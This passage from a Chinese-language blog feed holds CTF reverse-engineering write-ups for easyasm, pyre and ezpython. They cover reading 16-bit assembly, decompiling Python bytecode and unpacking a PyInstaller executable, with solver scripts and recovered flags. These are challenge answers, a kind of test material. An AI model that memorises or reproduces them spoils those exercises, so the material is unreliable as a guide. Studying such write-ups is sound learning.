        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>看懂汇编代码逻辑</li></ul><hr><p><a href="https://www.ctfer.vip/problem/1860">HGAME-easyasm</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>将文件拖入 Exeinfo PE 查看文件类型：<br><img src="https://s2.loli.net/2023/03/18/2N196wbYzKITXPV.png" alt="HGAME-easyasm1.png"><br>发现文件是一个 16位 的 MS-DOS 程序</p></li><li><p>拖入 IDA，对 start 函数 F5 反编译发现无法编译<br><img src="https://s2.loli.net/2023/03/18/aDOgtIUdYuvk849.png" alt="HGAME-easyasm2.png"><br>可能是 IDA 无法反编译 16位 程序</p></li><li><p>直接查看汇编代码：<br><img src="https://s2.loli.net/2023/03/18/83gvXGRZEThafzm.png" alt="HGAME-easyasm3.png"><br>首先将 <code>dseg</code> 移入 <code>ds</code> 段，将 <code>seg001</code> 移入 <code>es</code> 段<br><code>dseg</code> 的内容：<strong>hgame{Fill_in_your_flag}</strong><br><img src="https://s2.loli.net/2023/03/18/hBUzsDkwSJErc4P.png" alt="HGAME-easyasm4.png"><br><code>seg001</code> 的内容：<strong>[0x91, 0x61, 0x01, 0xC1, 0x41, 0xA0, 0x60, 0x41, 0xD1, 0x21, 0x14, 0xC1, 0x41, 0xE2, 0x50, 0xE1, 0xE2, 0x54, 0x20, 0xC1, 0xE2, 0x60, 0x14, 0x30, 0xD1, 0x51, 0xC0, 0x17, 0x00, 0x00, 0x00, 0x00]</strong><br><img src="https://s2.loli.net/2023/03/18/oV2tuvEILkhWepx.png" alt="HGAME-easyasm5.png"></p></li><li><p>初始时 <code>si = 0</code>，根据：</p><pre class="language-c" data-language="c"><code class="language-c">loc_100DD<span class="token operator">:</span>                              <span class="token punctuation">;</span> CODE XREF<span class="token operator">:</span> start<span class="token operator">+</span><span class="token number">38</span>↓jcmp     si<span class="token punctuation">,</span> <span class="token number">1</span>Chjz      <span class="token keyword">short</span> loc_10135<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>add     si<span class="token punctuation">,</span> <span class="token number">1</span>cmp     al<span class="token punctuation">,</span> es<span class="token operator">:</span><span class="token punctuation">[</span>si<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>jz      <span class="token keyword">short</span> loc_100DDmov     ax<span class="token punctuation">,</span> <span class="token number">0</span>B800hmov     es<span class="token punctuation">,</span> axassume es<span class="token operator">:</span>nothingmov     byte ptr es<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">77</span>h <span class="token punctuation">;</span> <span class="token char">'w'</span>mov     byte ptr es<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">72</span>h <span class="token punctuation">;</span> <span class="token char">'r'</span>mov     byte ptr es<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">6F</span>h <span class="token punctuation">;</span> <span class="token char">'o'</span>mov     byte ptr es<span class="token operator">:</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">6</span>Eh <span class="token punctuation">;</span> <span class="token char">'n'</span>mov     byte ptr es<span class="token operator">:</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">67</span>h <span class="token punctuation">;</span> <span class="token char">'g'</span>mov     byte ptr es<span class="token operator">:</span><span class="token number">0</span>Ah<span class="token punctuation">,</span> <span class="token number">21</span>h <span class="token punctuation">;</span> <span class="token char">'!'</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>loc_10135<span class="token operator">:</span>                              <span class="token punctuation">;</span> CODE XREF<span class="token operator">:</span> start<span class="token operator">+</span><span class="token number">10</span>↑jmov     ax<span class="token punctuation">,</span> <span class="token number">0</span>B800hmov     es<span class="token punctuation">,</span> axmov     byte ptr es<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">72</span>h <span class="token punctuation">;</span> <span class="token char">'r'</span>mov     byte ptr es<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">69</span>h <span class="token punctuation">;</span> <span class="token char">'i'</span>mov     byte ptr es<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">67</span>h <span class="token punctuation">;</span> <span class="token char">'g'</span>mov     byte ptr es<span class="token operator">:</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">68</span>h <span class="token punctuation">;</span> <span class="token char">'h'</span>mov     byte ptr es<span class="token operator">:</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">74</span>h <span class="token punctuation">;</span> <span class="token char">'t'</span>mov     byte ptr es<span class="token operator">:</span><span class="token number">0</span>Ah<span class="token punctuation">,</span> <span class="token number">21</span>h <span class="token punctuation">;</span> <span class="token char">'!'</span></code></pre><p>可知 <code>loc_100DD</code> 是一个循环，循环的次数由计数器 <code>si</code> 的值控制，每循环一次 si + 1<br>当 <code>si = 1Ch</code> 时，输出 “right!”<br>并且每一轮循环都必须满足 <code>al = es:[si-1]</code>，否则就输出 “wrong!”</p></li><li><p>根据：</p><pre class="language-c" data-language="c"><code class="language-c">xor     ax<span class="token punctuation">,</span> axmov     al<span class="token punctuation">,</span> <span class="token punctuation">[</span>si<span class="token punctuation">]</span>shl     al<span class="token punctuation">,</span> <span class="token number">1</span>shl     al<span class="token punctuation">,</span> <span class="token number">1</span>shl     al<span class="token punctuation">,</span> <span class="token number">1</span>shl     al<span class="token punctuation">,</span> <span class="token number">1</span>push    ax</code></pre><p>首先通过异或 <code>xor     ax, ax</code> 将 <code>ax</code> 清零，然后<em>将 <code>si</code> 中存放的值作为地址，取该地址上的值作为 <code>[si]</code> 【间接寻址，<code>si</code> 中存放的是操作数的地址】</em>，将 <code>[si]</code> 的值存入 <code>ax</code>，然后 4个 <code>shl     al, 1</code> 将 <code>al</code> 逻辑左移【低位补0】 4位后，将 <code>ax</code> 送入堆栈段</p></li><li><p>同理，根据：</p><pre class="language-c" data-language="c"><code class="language-c">xor     ax<span class="token punctuation">,</span> axmov     al<span class="token punctuation">,</span> <span class="token punctuation">[</span>si<span class="token punctuation">]</span>shr     al<span class="token punctuation">,</span> <span class="token number">1</span>shr     al<span class="token punctuation">,</span> <span class="token number">1</span>shr     al<span class="token punctuation">,</span> <span class="token number">1</span>shr     al<span class="token punctuation">,</span> <span class="token number">1</span></code></pre><p>首先通过异或 <code>xor     ax, ax</code> 将 <code>ax</code> 清零，接着将 <code>[si]</code> 的值存入 <code>ax</code>，然后 4个 <code>shr     al, 1</code> 将 <code>al</code> 逻辑右移【高位补0】 4位</p></li><li><p><mark>注意这里：</mark></p><pre class="language-c" data-language="c"><code class="language-c">pop     bxadd     ax<span class="token punctuation">,</span> bx</code></pre><p>这里将刚刚 <code>push    ax</code> 时入栈的 <code>ax</code> 出栈作为 <code>bx</code><br>假设 <code>[si] = xxxx yyyy</code><br>此时的 <code>bx</code> 应该为 <code>yyyy 0000</code>，而此时 ax 的值为 <code>0000 xxxx</code><br>因此 <code>add     ax, bx</code> 后，<code>ax = yyyy xxxx</code><br>即：<em><strong>此过程其实就是将 <code>[si]</code> 的高位和低位互换位置</strong></em></p></li><li><p>根据：</p><pre class="language-c" data-language="c"><code class="language-c">xor     ax<span class="token punctuation">,</span> <span class="token number">17</span>hadd     si<span class="token punctuation">,</span> <span class="token number">1</span>cmp     al<span class="token punctuation">,</span> es<span class="token operator">:</span><span class="token punctuation">[</span>si<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>jz      <span class="token keyword">short</span> loc_100DD</code></pre><p>这里将 <code>ax</code>【互换高位和低位后的 <code>[si]</code>】 与 0x17 异或，计数器 <code>si</code> 加一，然后将 <code>al</code> 与以 <code>es</code> 为段首址、以 <code>si - 1</code> 为偏移地址的地址处的值进行比较【<code>ES</code> 是附加数据段的段首址】，如果相等就继续往下循环，否则就输出 “wrong!”</p></li><li><p>因此，程序逻辑就是将 flag 的每个字符的 前四位 和 后四位 进行置换，然后与 0x17 异或，再与 <code>es</code> 段的数据进行逐位比较</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-python" data-language="python"><code class="language-python">unk_10030 <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0xE1</span><span class="token punctuation">,</span>      <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span>  <span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x1c</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      key <span class="token operator">=</span> unk_10030<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x17</span>      key_h <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>key <span class="token operator">/</span> <span class="token number">16</span><span class="token punctuation">)</span>      key_l <span class="token operator">=</span> key <span class="token operator">-</span> key_h <span class="token operator">*</span> <span class="token number">16</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>key_l <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> key_h<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>hgame{welc0me_to_4sm_w0rld}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/JbF5BD4AVLEnsNC.png" alt="HGAME-easyasm6.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GWCTF-pyre</title>
      <link href="/2023/039c92f9e.html"/>
      <url>/2023/039c92f9e.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>关于对 python 的 .pyc 反编译时，uncompyle6 的 python 版本问题</p></li><li><p><mark>python 中的转义字符 “\x” 的含义<br>例如：’ \x1f ‘ 代表的是一个 char 字符型，这个字符的 ASCii 码为 0x1F</mark></p></li></ul><hr><p>[GWCTF-pyre](<a href="https://www.ctfer.vip/problem/251">NSSCTF - [GWCTF 2019]pyre (ctfer.vip)</a>)</p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>解压得到 .pyc 文件，用本机 uncompyle6 反编译<br><img src="https://s2.loli.net/2023/03/18/puSqz5radXimx4o.png" alt="GWCTF-pyre1.png"><br>提示 python 3.10.4 版本不对</p></li><li><p>用虚拟机 python 3.8.2 反编译成功<br><img src="https://s2.loli.net/2023/03/18/PDow96jNcQ2kixO.png" alt="GWCTF-pyre2.png"><br><mark>python 3.10.4 反编译经常出问题，可能是兼容性不好，还是建议用虚拟机的 python 3.8</mark></p></li><li><p>此外，也可以使用在线反编译网站进行反编译<br><img src="https://s2.loli.net/2023/03/18/ykKH6fcxVvXWJ89.png" alt="GWCTF-pyre3.png"></p></li><li><p>得到代码：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Welcome to Re World!'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Your input1 is your flag~'</span><span class="token punctuation">)</span>l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input1<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>input1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span> <span class="token operator">+</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span>    code <span class="token operator">+=</span> num<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> code<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\x1f'</span><span class="token punctuation">,</span> <span class="token string">'\x12'</span><span class="token punctuation">,</span> <span class="token string">'\x1d'</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'\x01'</span><span class="token punctuation">,</span> <span class="token string">'\x06'</span><span class="token punctuation">,</span> <span class="token string">'\x14'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">'\x1b'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">'\x01'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">'\x13'</span><span class="token punctuation">]</span></code></pre></li><li><p>注意这里 code 的写法：</p><pre class="language-python" data-language="python"><code class="language-python">code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\x1f'</span><span class="token punctuation">,</span> <span class="token string">'\x12'</span><span class="token punctuation">,</span> <span class="token string">'\x1d'</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'\x01'</span><span class="token punctuation">,</span> <span class="token string">'\x06'</span><span class="token punctuation">,</span> <span class="token string">'\x14'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">'\x1b'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">'\x01'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">'\x13'</span><span class="token punctuation">]</span></code></pre><p><mark>code 是一个列表，而 “\x” 是python 中的转义字符，\x1f 代表值为十六进制 0x1F 所对应的字符</mark><br><img src="https://s2.loli.net/2023/03/18/Hf96Uu5qyEzTIZN.png" alt="GWCTF-pyre4.png"></p></li><li><p>将 code 列表中的字符元素统一转为十六进制：</p><pre class="language-python" data-language="python"><code class="language-python">code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x1f</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x1d</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span>          <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">]</span></code></pre></li><li><p>逆向代码即可，题目已知最后的 code 列表状态，先通过：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> code<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span></code></pre><p>对 code 进行初始化，<mark>注意这里，刚开始是通过正向异或得到 code，返回去需要逆向异或，即逆向 for 循环：</mark></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> code<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span></code></pre><p>得到：<code>[71, 88, 74, 87, 127, 79, 123, 122, 124, 104, 92, 112, 107, 62, 1, 110, 88, 114, 72, 73, 13, 54, 19]</code></p></li><li><p>然后根据 code 的长度为 23，推测 input1 的长度也为 23。通过正向暴力破解，寻找满足条件：<code>code[i] == ((j + i) % 128 + 128) % 128</code> 的字符，将其输出即可得到 flag</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Welcome to Re World!'</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Your input1 is your flag~'</span><span class="token punctuation">)</span>    code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x1f</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x1d</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span>          <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> code<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token keyword">if</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>j <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span> <span class="token operator">+</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span><span class="token punctuation">:</span>              <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>              <span class="token keyword">break</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>GWHT{Just_Re_1s_Ha66y!}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/ZYR3xzIgPomeB4J.png" alt="GWCTF-pyre5.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NISACTF-ezpython</title>
      <link href="/2023/03cf3a606a.html"/>
      <url>/2023/03cf3a606a.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>熟悉 <mark>python 逆向</mark>中 exe 解包工具 pyinstxtractor.py 的使用方法【.exe -&gt; .pyc】</p></li><li><p>熟悉 python 逆向中反编译工具 uncompyle6 的使用方法【.pyc -&gt; .py】</p></li><li><p><mark>用反编译后生成的 struct 文件的文件头修复损坏的 .pyc 文件头</mark></p></li></ul><hr><p><a href="https://www.ctfer.vip/problem/2038">NISACTF-ezpython</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看 exeinfo pe，为 python 逆向<br><img src="https://s2.loli.net/2023/03/18/ZG9DB2PYzAl1xCE.png" alt="NISACTF-ezpython1.png"></p></li><li><p>用 pyinstxtractor.py 进行常规解包：<code>python pyinstxtractor.py ez_python.exe</code><br><img src="https://s2.loli.net/2023/03/18/rFLsRey6IPlTHBa.png" alt="NISACTF-ezpython2.png"></p></li><li><p><strong>根据 <code>[*] Python version: 34</code> 可知该 exe 文件对应的 python 版本为 python 3.4</strong><br>【如：38 对应 python 3.8；310 对应 python 3.10】</p></li><li><p>在生成的文件夹下，发现一个<strong>没有后缀名的 src 文件</strong><br><img src="https://s2.loli.net/2023/03/18/iyre5PYoDtIpB4l.png" alt="NISACTF-ezpython3.png"><br> 这里还存在一个<strong>没有后缀名的 struct 文件是 python 逆向后必有的，虽然没有后缀名，但它是一个 .pyc 文件</strong></p></li><li><p>在 exeinfo pe 下查看 src 文件：<br><img src="https://s2.loli.net/2023/03/18/xlQrmvoK4VXphTZ.png" alt="NISACTF-ezpython4.png"><br> 无法识别，但是文件头很奇怪，应该又是被修改了</p></li><li><p>用 struct 文件的文件头修复 src（将文件头第一行替换即可）<br><img src="https://s2.loli.net/2023/03/18/xlQrmvoK4VXphTZ.png" alt="NISACTF-ezpython5.png"><br><img src="https://s2.loli.net/2023/03/18/esK2pS4POGyUiNb.png" alt="NISACTF-ezpython6.png"></p></li><li><p>根据 python 版本，需要用 python 3.4 进行编译<br>得到代码：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> rsa<span class="token keyword">import</span> base64key1 <span class="token operator">=</span> rsa<span class="token punctuation">.</span>PrivateKey<span class="token punctuation">.</span>load_pkcs1<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token 